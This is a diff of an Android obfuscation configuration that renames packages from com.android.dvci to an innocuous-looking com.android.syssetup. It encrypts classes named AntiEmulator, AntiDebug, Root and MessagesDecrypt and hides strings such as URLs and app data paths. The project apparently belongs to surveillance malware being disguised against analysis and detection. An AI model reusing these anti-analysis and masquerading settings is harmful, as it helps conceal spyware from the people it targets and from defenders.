@@ -1,14 +1,14 @@
 
 #-verbose
--encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
-		com.android.dvci.Root,com.android.dvci.Core,
-		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator
+-encryptclasses com.android.syssetup.util.AntiEmulator,com.android.syssetup.MessagesDecrypt,
+		com.android.syssetup.Root,com.android.syssetup.Core,
+		com.android.syssetup.util.AntiDebug,com.android.syssetup.util.AntiEmulator
 
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
 -encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
 
 -encryptclasses com.android.m.*
--encryptstrings "KY*"
+-encryptstrings "KN*"
 -encryptstrings "android.intent.*","android.net.*","vnd.android.*"
 
 -accessthroughreflection class android.content.pm.ApplicationInfo {
@@ -24,6 +24,7 @@
 
 #-dontobfuscate
 #-dontoptimize
+#-dontcompress
 
 #  here:  !code/simplification/*
 #-optimizations !code/*
@@ -44,11 +45,11 @@
 @MAPPING@ -applymapping "rcs_mapping.txt"
 
 #togliere l'offuscamento di iSR
--keepclassmembers class com.android.dvci.Core {
+-keepclassmembers class com.android.syssetup.Core {
     public static boolean iSR();
 }
 
-#-keepclassmembers class com.android.dvci.util.Instrument
+#-keepclassmembers class com.android.syssetup.util.Instrument
 
 -keepresourcexmlattributenames assets/*.bin, 
     manifest/installLocation,
@@ -58,16 +59,14 @@
     res/values/*
 
 -keep public class android.media.AmrInputStream
--keep public class com.android.dvci.BM
--keep public class com.android.dvci.listener.AR
--keep public class com.android.dvci.optimize.NetworkOptimizer
-@RELEASE@ -keep public class com.android.dvci.gui.ASG
+-keep public class com.android.syssetup.Broad
+-keep public class com.android.syssetup.listener.AdR
+-keep public class com.android.syssetup.optimize.SetupSystem
+@RELEASE@ -keep public class com.android.syssetup.gui.SetGui
 
 #-keep class com.musicg.** { *; }
 -keep class android.media.** {*;}
 #-keep class com.sun.media.sound.** { *; }
-
-
     
 -assumenosideeffects class android.util.Log {
     public static boolean isLoggable(java.lang.String, int);
@@ -78,7 +77,7 @@
     public static int e(...);
 }
 
--assumenosideeffects class com.android.dvci.util.Check {
+-assumenosideeffects class com.android.syssetup.util.Check {
     public static void asserts(...);
     public static void requires(...);
     public static void ensures(...);
